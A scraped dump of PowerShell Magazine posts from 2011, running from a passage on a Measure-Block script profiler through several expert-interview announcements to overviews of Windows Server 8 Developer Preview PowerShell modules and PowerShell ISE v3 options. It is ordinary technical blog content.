Measure-Block -Process -ScriptBlock { TestScript } | Format-MeasureBlock The above script snippet defines a function with a few Measure-Block calls distributed amongst the code. Each of the calls to Measure-Block profiles the script block that is provided with the call to the function. The resulting object model is hierarchal and allows for more detailed analysis. Imagine a tree where the durations of the children make up the duration of their parent.\n Root – 10 Seconds  Loop 1 – 5 Seconds  Get-Process – 3 Seconds Get-Service – 2 Seconds   Loop 2 – 5 Seconds  Start-Service – 5 Seconds      There is also a Format-MeasureBlock command that flattens and outputs the object for a quick glance on profiling. Here’s some example output. Note that the name can be customized but by default is set to the location in the script.\nName Duration Scope ---- -------- ----- MEASURE_BLOCK:285:4 00:00:01.8197878 1 #Inside TestScript MEASURE_BLOCK:286:17 00:00:00.0075114 2 #Get-Process MEASURE_BLOCK:287:5 00:00:01.7896269 2 #The Total Loop MEASURE_BLOCK:290:7 00:00:00.0087703 3 #Each Loop Iteration MEASURE_BLOCK:290:7 00:00:00.0042948 3 #... MEASURE_BLOCK:290:7 00:00:00.0157303 3 MEASURE_BLOCK:290:7 00:00:00.0161733 3 When the outer Measure-Block command is not present the inner non-Process commands will simply behave as a pass-through, effectively turning off profiling. Like any good profiler, the Measure-Block cmdlet will add overhead to a script because of the extra processing that is going on to collect the data.\nInside Measure-Block Measure-Block works by tracking command duration with a Stopwatch. This is the same mechanism that Measure-Command uses. Start and Stop are called during the Begin and End of the Measure-Block function.\nThe command also utilizes the Stack class to keep track of the different Measure-Block calls. During the Begin method in the Measure-Block function, a new “MeasureBlock” object is pushed onto the Stack and the Scope depth variable is increased. The object is also added to the previous object’s Children collection. This is all done using the Push-MeasureBlockScope function.\nfunction Push-MeasureBlockScope() { [CmdletBinding()] param( [Parameter()] $MeasureBlock ) Begin { if ($Global:MeasureBlockScope -ne ) { $Global:MeasureBlockStack.Peek().Children += $MeasureBlock $MeasureBlock.Scope = $Global:MeasureBlockScope $Global:MeasureBlockScope++ } $Global:MeasureBlockStack.Push($MeasureBlock) } } During the End method, the Pop-MeasureBlockScope is called to move back up the stack. The Process method of the function works in three different ways. If there is input on the pipeline but no script block the input is simply pushed through the cmdlet. If there is input on the pipeline and a script block, the input is piped to the script block. Finally, if there is only a script block, it is simply invoked.\nThis allows the Measure-Block function to not only utilize script blocks, like Measure-Command, but also allows it to be integrated into the pipeline. One thing to note is that if you integrate it into the pipeline the Begin and End portions of the previous command will not be taken into consideration when calculating the Duration.\nAnother interesting caveat of having the Measure-Block function as part of the pipeline is the order in which parts of commands are processed. For example, with a pipeline as follows:\nPS\u0026gt; Measure-Block { Get-Process } | Measure-Block { Format-Table} The processing of command would be in this sequence:\n Get-Process:Begin Get-Process:Process Format-Table:Begin Format-Table:Process … Format-Table:Process Format-Table:End Get-Process:End  The second MeasureBlock object would be the child of the first due to the way these commands are processed! Measure-Block may be a function that you would only use in very dire circumstances but it is an interesting experiment into the pipeline, function processing and script blocks.\nDownload the scripts for this article here.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/15/advanced-script-profiling/","tags":["Performance"],"title":"Advanced Script Profiling"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favourite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nThe PowerShell Experts video series continues with the interview with Craig Martin, a FIM MVP. In this video, Craig shared his views on PowerShell v3 and the future of PowerShell.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/15/an-interview-with-powershell-expert-craig-martin/","tags":["Interviews"],"title":"An interview with PowerShell expert Craig Martin"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favorite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nThe PowerShell Experts video series continues with the interview withMarc van Orsouw a.k.a the PowerShell Guy a.k.a MoW, a PowerShell MVP known for his WMI Explorer script. In this video, MoW shared his views on PowerShell v3 and the future of PowerShell.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/14/an-interview-with-powershell-expert-marc-van-orsouw/","tags":["Interviews"],"title":"An interview with PowerShell expert Marc van Orsouw"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favourite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nThe PowerShell Experts video series continues with the interview with Bartek Bielawski, a PowerShell MVP from Poland. In this video, Bartek shared his views on PowerShell v3 and the future of PowerShell.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/11/an-interview-with-powershell-expert-bartek-bielawski/","tags":["Interviews"],"title":"An interview with PowerShell expert Bartek Bielawski"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favourite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nThe PowerShell Experts video series continues with the interview with James O’Neill, an active PowerShell community member and the brain behind PowerShell cmdlets for Hyper-V! In this video, James shared his views on PowerShell v3 and the future of PowerShell.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/10/an-interview-with-powershell-expert-james-oneill/","tags":["Interviews"],"title":"An interview with PowerShell expert James O’Neill"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favourite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nThe PowerShell Experts video series continues with the interview with Bruce Payette, Principal Developer with the PowerShell product team and the man behind the most famous PowerShell book — Windows PowerShell in Action! In this video, Bruce shared his views on PowerShell v3 and the future of PowerShell.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/08/an-interview-with-powershell-expert-bruce-payette/","tags":["Interviews"],"title":"An interview with PowerShell expert Bruce Payette"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favourite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nThe PowerShell Experts video series continues with the interview with Kirk Munro, a PowerShell MVP and a product manager for PowerSE and PowerWF at DevFarm. In this video, Kirk shared his views on PowerShell v3 and the future of PowerShell.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/08/an-interview-with-powershell-expert-kirk-munro/","tags":["Interviews"],"title":"An interview with PowerShell expert Kirk Munro"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favourite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nThe PowerShell Experts video series continues with the interview with Thomas Lee, a PowerShell MVP and a trainer. In this video, Thomas shared his views on PowerShell v3 and the future of PowerShell.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/07/an-interview-with-powershell-expert-thomas-lee/","tags":["Interviews"],"title":"An interview with PowerShell expert Thomas Lee"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favourite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nThe PowerShell Experts video series continues with the interview with Jan Egil Ring, a PowerShell MVP and an active community member. In this video, Jan Egil Ring shared his views on PowerShell v3 and the future of PowerShell.\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/03/an-interview-with-powershell-expert-jan-egil-ring/","tags":["Interviews"],"title":"An interview with PowerShell expert Jan Egil Ring"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favourite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nThe PowerShell Experts video series continues with the interview with Jason Shirk, a senior SDE on the Windows PowerShell team at Microsoft. In this video, Jason Shirk shared his views on PowerShell v3 and the future of PowerShell.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/03/an-interview-with-powershell-expert-jason-shirk/","tags":["Interviews"],"title":"An interview with PowerShell expert Jason Shirk"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favourite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nThe PowerShell Experts video series continues with the interview with Jeff Hicks, a PowerShell MVP and a trainer. In this video, Jeff Hicks shared his views on PowerShell v3 and the future of PowerShell.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/02/an-interview-with-powershell-expert-jeff-hicks/","tags":["Interviews"],"title":"An interview with PowerShell expert Jeff Hicks"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favourite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nThe PowerShell Experts video series continues with the interview with Jeff Truman, an IT professional and an active PowerShell community member from Florida, USA. In this video, Jeff Truman shared his views on PowerShell and the future of PowerShell.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/01/an-interview-with-powershell-expert-jeff-truman/","tags":["Interviews"],"title":"An interview with PowerShell expert Jeff Truman"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favourite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nThe PowerShell Experts video series continues with the interview with Tobias Weltner, PowerShell MVP and a co-founder of PowerShell.com and PowerShellCommunity.org. In this video, Tobias shared his views on PowerShell v3 and the future of PowerShell.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/10/31/an-interview-with-powershell-expert-tobias-weltner/","tags":["Interviews"],"title":"An interview with PowerShell expert Tobias Weltner"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favourite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nThe PowerShell Experts video series continues with the interview with Kenneth Hansen, Lead Program Manager on the Windows PowerShell team at Microsoft. In this video, Ken shared his views on PowerShell v3 and the future of PowerShell.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/10/28/an-interview-with-powershell-expert-kenneth-hansen/","tags":["Interviews"],"title":"An interview with PowerShell expert Kenneth Hansen"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favorite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nStarting today, we will post one video interview per day. The first one is with Dmitry Sotnikov.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/10/24/an-interview-with-powershell-expert-dmitry-sotnikov/","tags":["Interviews"],"title":"An interview with PowerShell expert Dmitry Sotnikov"},{"categories":["News"],"contents":" This article describes features in a preview of the next version of Windows Server, and features described may and probably will change in the final product.\n At the BUILD conference in Anaheim, California in September Microsoft released a preview version of the client and server versions of the next version of Windows. We have looked into some of the new features in Windows Server 8 Developer Preview.\nSince Windows 7 and Windows Server 2008 R2, Windows PowerShell is built into the operating system and thus the Preview versions of Windows contain a preview of Windows PowerShell 3.0.\nAmong many new features in PowerShell 3.0 which we will see used in the next version of Windows Server is workflows. The workflow functionality is based on Windows Workflow Foundation, and provides the ability to run complex and large multi-machine management tasks while being repeatable, parallelizable, interruptible, and recoverable.\nFor those not able to try out the new Preview versions of Windows, another way to explore Windows PowerShell 3.0 is the Community Technology Preview released shortly after the BUILD conference. To read more about new features in PowerShell 3.0, I would recommend the “PowerShell V3 Featured Articles” page on TechNet Wiki.\nPowerShell modules As we would expect, there is a great number of new PowerShell modules compared to Windows Server 2008 R2. Note that some modules become available when installing a server role, or the Remote Server Administration Tool for a server role. This applies to the modules marked with a * in the below output:\nPS\u0026gt; Get-Module -ListAvailable Directory: C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules ModuleType Name ExportedCommands ---------- ---- ---------------- Manifest ActiveDirectory * {Get-ADRootDSE, New-ADObject... Manifest ADDeploymentWF Invoke-ADCommand Manifest ADDSDeployment * {Add-ADDSReadOnlyDomainContr... Manifest ADRMSAdmin * {Update-RmsCluster, Get-RmsS... Manifest AppLocker {Set-AppLockerPolicy, Get-Ap... Manifest Appx {Add-AppxPackage, Get-AppxPa... Manifest BestPractices {Get-BpaModel, Invoke-BpaMod... Manifest BitsTransfer {Add-BitsFile, Remove-BitsTr... Manifest BranchCache {Add-BCDataCacheExtension, C... Manifest CimCmdlets {Get-CimInstance, Get-CimSes... Manifest ClusterAwareUpdating {Get-CauPlugin, Register-Cau... Manifest DhcpServer * {Get-DhcpServerAuditLog, Set... Manifest DirectAccessClientComp... {Get-DASiteTableEntry, Set-D... Manifest Dism Apply-Unattend Manifest DnsClient {Resolve-DnsName, Get-DNSCli... Manifest DnsConfig {Get-DNSClient, Set-DNSClien... Binary DnsLookup Resolve-DnsName Manifest DnsNrpt {Get-DnsClientEffectiveNrptP... Manifest DnsServer * {Clear-DnsServerCache, Get-D... Manifest FailoverClusters {Add-ClusterCheckpoint, Add-... Manifest FileServer {Get-SmbShareWF, Get-FsrmQuo... Manifest GroupPolicy * {Backup-GPO, Copy-GPO, Get-G... Manifest Hyper-V {Add-VMDvdDrive, Add-VMNetwo... Manifest iSCSI {Connect-iSCSIDiscoveredTarg... Manifest KdsCmdlets {Get-KdsRootKey, Add-KdsRoot... Manifest Microsoft.PowerShell.Core {Get-Command, Get-Help, Upda... Manifest Microsoft.PowerShell.D... {Get-WinEvent, Get-Counter, ... Manifest Microsoft.PowerShell.Host {Start-Transcript, Stop-Tran... Manifest Microsoft.PowerShell.M... {Add-Content, Clear-Content,... Manifest Microsoft.PowerShell.S... {Get-Acl, Set-Acl, Get-PfxCe... Manifest Microsoft.PowerShell.U... {Format-List, Format-Custom,... Manifest Microsoft.WSMan.Manage... {Disable-WSManCredSSP, Enabl... Manifest MicrosoftiSCSITarget {Add-IscsiVirtualDiskTargetM... Manifest MsDtc {New-DtcDiagnosticTransactio... Manifest NetAdapter {Rename-NetAdapter, Set-NetA... Manifest NetLbfo {Get-NetLbfoTeam, Remove-Net... Manifest NetQos {Get-NetQosPolicy, Set-NetQo... Manifest NetSwitchTeam {Get-NetSwitchTeam, Remove-N... Manifest NetTCPIP {Get-NetIPAddress, Set-NetIP... Manifest netwnv {New-NetVirtualizationAddres... Manifest NetworkConnectivityStatus {Get-DAConnectionStatus, Get... Manifest NetworkLoadBalancingCl...*{Add-NlbClusterNode, Add-Nlb... Manifest NetworkSecurity {New-NetAuthenticationPropos... Manifest NetworkTransition {Get-Net6to4Configuration, S... Manifest PKIClient {Get-AutoEnrollmentPolicy, S... Manifest PrintManagement {Get-Printer, Remove-Printer... Manifest PS_MMAgent {Disable-MMAgent, Enable-MMA... Manifest PSDiagnostics {Start-Trace, Stop-Trace, En... Manifest PSScheduledJob {New-JobTrigger, Add-JobTrig... Manifest PSWorkflow {Import-PSWorkflow, New-PSWo... Manifest RDManagement {Grant-OrgUnitAccess, Test-O... Manifest RemoteAccess * {Set-DAAppServerConnection, ... Manifest ScheduledTasks {New-JobTrigger, Add-JobTrig... Manifest SecureBoot {Confirm-SecureBootUEFI, Set... Manifest ServerManager {Add-WindowsFeature, Remove-... Manifest ServerManagerShell {WFAddRemoveServerComponentA... Manifest SmbShare {Get-SmbShare, Remove-SmbSha... Manifest SmbWitness {Get-SmbWitnessCluster, Get-... Manifest Storage {Add-InitiatorIdToMaskingSet... Manifest TelemetryManagement {Set-CEIP, Set-WER} Manifest TroubleshootingPack {Get-TroubleshootingPack, In... Manifest TrustedPlatformModule {Get-Tpm, Initialize-Tpm, Cl... Manifest UserAccessLogging {Enable-Ual, Disable-Ual, Ge... Manifest Wdac {Get-OdbcDriver, Set-OdbcDri... Manifest Whea {Get-WheaMemoryPolicy, Set-W... We can see that it is a long list of modules, so let us use Measure-Object to count them:\nPS\u0026gt; (Get-Module -ListAvailable | Measure-Object).Count 65 57 modules were included by default, while an additional 8 become available when installing additional administration tools and server roles. Note that even more modules may be available, since the server we are running in the test-lab does not have all server roles installed.\nAs you can understand, going through each module in one article is not possible, so we are highlighting some of the more interesting ones.\nThe Active Directory module which was available in Windows Server 2008 R2 is extended from 76 to 134 cmdlets. Some of the new cmdlets are providing support for managing Active Directory Replication, including sites, site links, subnets, etc. There is also support for managing some new features like Central Access Policies, Central Access Rules, and Claims. If you are interested in learning more about the new claims-based access control features, there are two webcasts on this topic available on Channel 9:\nUsing claims-based access control for compliance and information governance\nUsing classification for access control and compliance\nAnother interesting observation is related to Active Directory Deployment. When the Active Directory Domain Services role is installed, and dcpromo.exe is launched, we are presented with the following message:\nThe Active Directory Domain Services Installation Wizard is relocated in Server Manager. For more information, see http://go.microsoft.com/fwlink/?LinkId=220921\nDcpromo.exe is replaced by a PowerShell module, ADDSDeployment, which contains 73 cmdlets. When using Server Manager to install a domain controller, we are presented with the PowerShell code which will be run at the end of the wizard:\nPS\u0026gt; Import-Module ADDSDeployment PS\u0026gt; $pass = Read-Host -AsSecureString -Prompt \u0026#34;Enter Password\u0026#34; PS\u0026gt; Install-ADDSForest -DatabasePath \u0026#34;C:\\Windows\\NTDS\u0026#34; ` -DomainMode \u0026#34;Win8\u0026#34; ` -DomainName \u0026#34;lab.local\u0026#34; ` -ForestMode \u0026#34;Win8\u0026#34; ` -InstallDNS:$true ` -LogPath \u0026#34;C:\\Windows\\NTDS\u0026#34; ` -RebootOnCompletion:$true ` -SafeModeAdministratorPassword $pass ` -SYSVOLPath \u0026#34;C:\\Windows\\SYSVOL\u0026#34; Although dcpromo could be scripted in an unattended fashion in earlier versions of Windows Server, we welcome the PowerShell module for Active Directory Deployment.\nAnother note before leaving the Active Directory topic is the Group Policy module, which also was available in Windows Server 2008 R2. This seems to be almost the same, but there is one important new cmdlet: Invoke-GPUpdate.\nThere are many more interesting modules, like DhcpServer, DnsServer, FileServer, PrintManagement, and Storage, which we will not cover in this article. For your reference, a cmdlet-overview for all modules included in the Windows Server Developer Preview is exported to an Excel spreadsheet available here.\nServer Manager The new Server Manager has the ability to perform operations against multiple machines at the same time, such as adding roles and features. The remoting capabilities in the new Server Manager are based on both PowerShell Remoting (enabled by default in the Preview version) and WMI.\nThe fact that both the Active Directory Domain Services Installation Wizard and the Active Directory Administrative Center shows the PowerShell code that will execute behind the scenes is very welcome. This is something other Microsoft products, such as Exchange Server 2007/2010 and System Center Virtual Machine Manager have provided for quite some time. A suggestion for this feature to be enabled for all operations in the new Server Manager is available on Microsoft Connect. If this suggestion get enough votes, it may still be possible that Microsoft will implement this feature in the final product, so I strongly recommend that you vote if you agree.\nWindows PowerShell Web Access Another interesting feature available in the Windows Server Developer Preview is Windows PowerShell Web Access, making PowerShell available to web browsers and mobile devices. Imagine that you are not in front of your computer when you get a request to unlock an Active Directory user. You can access Windows PowerShell Web Access from your mobile device connected to the corporate wireless network and run Unlock-ADAccount . Screenshots and installation guidance is available in this blog post.\nConclusion The PowerShell coverage in the next version of Windows Server is going to be huge, making Microsoft`s flagship Windows Server even more enterprise-friendly in terms of automation and administration.\nI will round off this article by encouraging you to download and read what is called the Monad Manifesto – the Origin of Windows PowerShell. This is a document written in August 2002 by the inventor of Windows PowerShell, Jeffrey Snover, describing the vision of the project that later became Windows PowerShell. Another recommended reading is Jeffrey`s recent blog post about the Monad Manifesto.\nIt is amazing to see how the vision has turned into reality, and also what an important foundation for the next version of Windows Server the new automation framework has become.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/10/04/an-overview-of-windows-powershell-features-in-windows-server-8-developer-preview/","tags":["News"],"title":"An overview of Windows PowerShell features in Windows Server 8 Developer Preview"},{"categories":["PowerShell ISE","News"],"contents":"PowerShell Integrated Scripting Environment (ISE) in version 2 was a great addition for people who wanted a better script editor with syntax highlighting. It provided options to change preferences — the look and feel — using a simple scriptable object model. This scripting model was exposed through $psise object. It was a great start but nowhere near any of the 3rd-party script editors in the market.\nPowerShell ISE in version 3 is a leap ahead of its predecessor. PowerShell ISE in v3 improved the overall functionality by providing:\n Much improved IntelliSense with drop-down selection for object properties, methods, cmdlet and function names, cmdlet parameters, and argument values. The ability to add additional panes (horizontal or vertical) for custom add-ons Support for XML file highlighting Script regions folding and unfolding Code snippets support Copy with syntax color; when you copy script code from ISE into a rich text editor, the color scheme will be retained. A nice built-in and searchable help (F1) WPF window; it doesn\u0026rsquo;t open a CHM file anymore. Last but not least, a powerful $psise object model for extending ISE!  In this article, I will provide a quick overview of what changed under $psise.Options (this object contains all properties that define the look and feel of ISE) and then provide detailed information for some of the new properties under $psise.Options. The following table (a cheat sheet) shows these changes at a high level.\n Now, let us look at some of the new options that can be used to change the ISE\u0026#8217;s functional behavior. ### AutoSaveMinuteInterval This option is new in PowerShell ISE v3 and can be used to set the interval for auto save of scripts. This feature does not auto save the file but it enables auto recovery of unsaved file in case of an ISE crash or unexpected errors. This property accepts an Int16 value which means anything from -32768 to 32767 is a valid value. The following setting will reduce the auto save interval to one minute.\n$psISE.Options.AutoSaveMinuteInterval = 1 Setting a negative value will disable ISE auto save and the ability to recover unsaved files in the event of a crash.\nMost Recently Used (MRU) List \u0026amp; MruCount In PowerShell ISE v3, there is a most recently used scripts list. By default, this value is set to 10. You can change this by updating $psise.Options.MruCount property.\n$psISE.Options.MruCount = 2 Valid values for this property are anything in the range of 0 to 32. A change to this property persists over restart of ISE.\nIntelliSense in Command pane and Script pane One of the most important additions to the script editor in version 3 is the IntelliSense drop-down support similar to what you find in Visual Studio.\nThis feature shows both object properties and methods, cmdlet and function names and parameters in the drop-down. Also, as you hover the property or cmdlet names, you see a tooltip with the type of parameters and parametersets are available.\nFor properties and methods, you see a list of parameter types, all variants of methods along with possible arguments types and variations.\nThe new $psise.Optionsobject has 5 properties to alter the behavior of this new IntelliSense feature. By default, IntelliSense is enabled in both Script pane and Command pane.\nShowIntellisenseInCommandPane This property can be used to disable or enable IntelliSense in Command pane. For example,\n$psISE.Options.ShowIntellisenseInCommandPane = $false \u0026hellip; will disable the IntelliSense drop-down feature in the Command pane.\nShowIntellisenseInScriptPane This property under $psise.Options can be used to disable or enable IntelliSense drop-down feature in the Script pane. For example,\n$psISE.Options.ShowIntellisenseInScriptPane = $false \u0026hellip; will disable IntelliSense drop-down in the Script pane.\nIntellisenseTimeOutInSeconds This property can be used to configure how long ISE should search for an object\u0026rsquo;s properties and methods or cmdlet names or parameters before timing out. By default, this is set to 3 seconds. For example, if you have a huge list of modules, there is a good chance that three seconds may not be enough to get that complete list and start a filter based on what you are typing. This is where you may find increasing the time out value useful. You can do so by changing:\n$psISE.Options.IntellisenseTimeoutInSeconds = 5 If you notice, this property takes signed int32 values. This means, you can set a negative value as well. But, by doing so, ISE will crash the very next moment you do a TAB or put a dot next to a object. This is a bug!\nUseEnterToSelectInCommandPaneIntellisense \u0026amp; UseEnterToSelectInScriptPaneIntellisense These two properties can be used to configure how the IntelliSense drop-down treats a return keystroke.\nBy default, UseEnterToSelectInCommandPaneIntellisense is set to FALSE which means navigating to an item in the drop-down and pressing Enter won\u0026rsquo;t select the item. Instead, you either select the item using mouse or use tab to complete the property name. This can be enabled using:\n$psISE.Options.UseEnterToSelectInCommandPaneIntellisense = $true UseEnterToSelectInScriptPane is set to $true, by default. So, unless you really want to disable that behavior, you don\u0026rsquo;t have to touch this property.\nMake a note any changes to these options will persist over ISE restart.\nZoom In PowerShell ISE v2, at the bottom right-hand corner, you will see a slider to adjust the size of script font in the Script and all other panes. This isn\u0026rsquo;t really zoom! It just changes the font size as you adjust the slider. However, in PowerShell ISE v3, there is a new slider that really acts like a zoom slider you see in Word, PowerPoint, or Excel.\nThere is also a new property under $psise.Options called Zoom. So, as you move the slider right or left, this property gets updated and not the FontSize property. You can also set this property by:\n$psISE.Options.Zoom = 200 The valid values for this property are 20 to 400. I don\u0026rsquo;t really see a practical reason why you\u0026rsquo;d ever use this in a script. You can always use Ctrl++ and Ctrl+- to update the zoom factor. And, this change persists even after you restart ISE.\nShowCommandsOnStartup By default, ISE v3 opens a new vertical pane — essentially the same as Show-Command cmdlet — called Commands that helps you access the parameter and help information for all cmdlets available. This add-on can take a good amount of your ISE screen real estate even when you don’t need it and it opens every time you open ISE. This behavior can be disabled by setting $psISE.Options.ShowCommandsOnStartup to $false.\n$psISE.Options.ShowCommandsOnStartup = $false ShowOutlining and ShowLineNumbers In the Script pane of ISE v3, code folding is enabled and like all other 3rd-party commercial/free editors, you can have code regions and fold them. Here is how it looks:\nThe vertical line next to line numbers is the code outline and that can be disabled by setting $psise.Options.ShowOutlining to $false. This is how the editor window looks after we disable outlining.\nThe line numbers in the Script pane aren\u0026rsquo;t 